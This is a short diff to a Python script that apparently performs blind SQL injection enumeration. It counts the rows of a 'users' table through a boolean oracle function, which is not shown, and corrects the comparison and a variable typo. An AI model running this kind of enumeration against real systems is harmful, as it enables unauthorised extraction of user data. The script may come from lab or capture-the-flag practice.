@@ -20,11 +20,11 @@ def oracle(q):
 # Get rows in users table
 rows = 100
 while rows > 0:
-    query = f"(select count(*) from users) > {rows}"
+    query = f"(select count(*) from users) = {rows}"
     status = oracle(query)
-    if status == "taken":
+    if status:
         break
     else:
-        row -= 1
+        rows -= 1
 
 print(rows)
